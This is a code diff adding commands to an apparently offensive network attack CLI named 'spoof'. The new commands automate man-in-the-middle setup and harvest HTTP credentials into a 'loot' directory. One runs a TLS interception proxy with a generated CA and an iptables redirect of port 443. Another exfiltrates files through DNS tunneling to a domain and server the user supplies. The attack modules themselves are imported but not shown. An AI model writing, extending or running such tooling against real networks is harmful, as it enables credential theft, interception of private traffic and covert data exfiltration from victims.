@@ -62,6 +62,12 @@ def main(
     banner: bool = typer.Option(
         False, "--banner", "-b", help="show banner and exit",
     ),
+    capture: bool = typer.Option(
+        False, "--capture", help="enable http credential capture",
+    ),
+    web_dashboard: bool = typer.Option(
+        False, "--dashboard", help="enable web dashboard on port 8080",
+    ),
 ):
     if ctx.invoked_subcommand is not None:
         return
@@ -97,7 +103,20 @@ def main(
 
     render_banner(console)
 
-    session = create_session(cfg, config)
+    http_cap = None
+    dash = None
+    if capture:
+        from spoof.capture import HTTPCapture
+        http_cap = HTTPCapture(interface=cfg.session.interface or "")
+    if web_dashboard:
+        from spoof.dashboard_web import DashboardServer
+        dash = DashboardServer(None, port=8080)
+
+    session = SpoofSession(cfg, config_path=config, http_capture=http_cap)
+    if dash:
+        session._web_dashboard = dash
+        dash._session = session
+
     try:
         session.start()
         import time
@@ -426,6 +445,168 @@ def menu():
     """launch interactive tui menu"""
     from spoof.menu import SpoofMenu
     SpoofMenu().run()
+
+
+@app.command()
+def auto_mitm(
+    interface: Optional[str] = typer.Option(
+        None, "--interface", "-i", help="network interface",
+    ),
+    spoof_ip: Optional[str] = typer.Option(
+        None, "--spoof-ip", "-s", help="ip to redirect to",
+    ),
+    dns_target: Optional[str] = typer.Option(
+        None, "--domain", "-d", help="target domain",
+    ),
+    capture: bool = typer.Option(
+        False, "--capture", help="enable http credential capture",
+    ),
+    web_dashboard: bool = typer.Option(
+        False, "--dashboard", help="enable web dashboard on port 8080",
+    ),
+):
+    """auto-discover network and start mitm interactively"""
+    from spoof.auto_mode import auto_mitm_setup
+    from spoof.capture import HTTPCapture
+    from spoof.dashboard_web import DashboardServer
+
+    cfg = auto_mitm_setup(interface=interface, spoof_ip=spoof_ip, dns_target=dns_target, console=console)
+    if not cfg:
+        raise typer.Exit(1)
+
+    http_cap = HTTPCapture(interface=cfg.session.interface) if capture else None
+    dash = DashboardServer(None, port=8080) if web_dashboard else None
+
+    session = SpoofSession(cfg, http_capture=http_cap)
+    if dash:
+        session._web_dashboard = dash
+
+    try:
+        session.start()
+        import time
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]shutting down...[/yellow]")
+        session.stop()
+
+
+@app.command()
+def capture_http(
+    interface: Optional[str] = typer.Option(
+        None, "--interface", "-i", help="network interface",
+    ),
+    loot_dir: str = typer.Option(
+        "loot", "--loot-dir", help="directory to save captured data",
+    ),
+):
+    """capture http traffic and harvest credentials"""
+    from spoof.capture import HTTPCapture
+
+    platform = get_platform()
+    iface = interface or platform.get_default_interface()
+    if not iface:
+        console.print("[red]no interface specified[/red]")
+        raise typer.Exit(1)
+
+    render_banner(console)
+    capture = HTTPCapture(loot_dir=loot_dir, interface=iface)
+    capture.start()
+
+    try:
+        import time
+        while True:
+            time.sleep(5)
+            if capture.credentials:
+                capture.display_loot(console)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]stopping...[/yellow]")
+        capture.stop()
+        capture.display_loot(console)
+
+
+@app.command()
+def ssl_intercept(
+    interface: Optional[str] = typer.Option(
+        None, "--interface", "-i", help="network interface",
+    ),
+    port: int = typer.Option(
+        8443, "--port", "-p", help="port to listen for tls interception",
+    ),
+    cert_dir: str = typer.Option(
+        "certs", "--cert-dir", help="directory for generated certificates",
+    ),
+):
+    """start ssl/tls interception proxy"""
+    from spoof.ssl_intercept import SSLInterceptor
+
+    render_banner(console)
+    interceptor = SSLInterceptor(cert_dir=cert_dir, listen_port=port, interface=interface)
+    interceptor.generate_ca()
+    interceptor.start()
+
+    console.print(f"[cyan]ssl interceptor running on port {port}[/cyan]")
+    console.print(f"[cyan]ca cert:[/cyan] {interceptor._ca_cert_path}")
+    console.print("[dim]redirect 443 → 8443: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443[/dim]")
+
+    try:
+        import time
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]stopping...[/yellow]")
+        interceptor.stop()
+
+
+@app.command()
+def exfiltrate(
+    filepath: str = typer.Argument(..., help="file to exfiltrate via dns"),
+    domain: str = typer.Option(..., "--domain", "-d", help="exfiltration domain"),
+    dns_server: str = typer.Option(..., "--dns-server", help="dns server to send queries to"),
+    interface: Optional[str] = typer.Option(
+        None, "--interface", "-i", help="network interface",
+    ),
+):
+    """exfiltrate a file via dns tunneling"""
+    from spoof.exfiltrate import DNSExfiltrator
+
+    platform = get_platform()
+    iface = interface or platform.get_default_interface()
+    if not iface:
+        console.print("[red]no interface specified[/red]")
+        raise typer.Exit(1)
+
+    render_banner(console)
+    exfil = DNSExfiltrator(domain=domain, interface=iface, dns_server=dns_server)
+    console.print(f"[cyan]exfiltrating {filepath} via {domain} -> {dns_server}...[/cyan]")
+    if exfil.exfiltrate_file(filepath):
+        console.print(f"[green]exfiltration complete: {exfil.stats}[/green]")
+    else:
+        console.print("[red]exfiltration failed[/red]")
+
+
+@app.command()
+def dashboard_web(
+    port: int = typer.Option(8080, "--port", "-p", help="web dashboard port"),
+):
+    """start web dashboard (standalone)"""
+    from spoof.dashboard_web import DashboardServer
+    from spoof.models import SpoofConfig
+
+    render_banner(console)
+    cfg = SpoofConfig()
+    session = SpoofSession(cfg)
+    dash = DashboardServer(session, port=port)
+    dash.start()
+    console.print(f"[green]dashboard:[/green] http://localhost:{port}")
+    console.print("[dim]ctrl+c to stop[/dim]")
+
+    try:
+        import time
+        while True:
+            time.sleep(5)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]stopping...[/yellow]")
 
 
 @app.command()
